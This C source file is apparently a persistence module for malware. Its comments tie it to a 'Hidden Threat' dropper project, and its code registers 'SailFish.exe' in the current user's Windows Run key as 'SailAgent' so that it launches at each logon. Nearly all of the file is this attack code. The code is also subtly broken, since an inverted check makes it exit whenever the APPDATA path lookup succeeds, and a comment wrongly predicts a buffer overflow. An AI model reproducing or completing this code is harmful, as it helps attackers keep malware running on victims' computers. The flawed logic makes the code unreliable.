#include <windows.h>
#include <stdio.h>
//This needs to be used with the “Hidden Threat” project (or another dropper). Because right now, I don’t want to complicate things further by writing code to determine the file’s location and copy it there.
//I just realized . It's very likely that the program will call this function over and over again every time it starts, and at some point it will trigger something like a buffer overflow. I need to fix this. 
int HkcuRegOpenKeyExA() {
    char appDataPath[MAX_PATH];
    char finalPath[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH) > 0) {
        return -1;
    }
    snprintf(finalPath, sizeof(finalPath), "%s\\Microsoft\\Windows\\Start Menu\\Programs\\SailFish.exe", appDataPath);

    HKEY hKEY;
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKEY
    );
    if (result == ERROR_SUCCESS) {
        const char* valueName = "SailAgent";

        LONG setRes = RegSetValueExA(
            hKEY,
            valueName,
            0,
            REG_SZ,
            (const BYTE*)finalPath,
            strlen(finalPath) + 1
        );
        RegCloseKey(hKEY);
        if (setRes == ERROR_SUCCESS) {
            printf(" Registry.\n");
        } else {
            printf(" RegSetValueExA : %ld\n", setRes);
        }
    } else {
        
        printf(" RegOpenKeyExA : %ld\n", result);
    }

    return 0;
}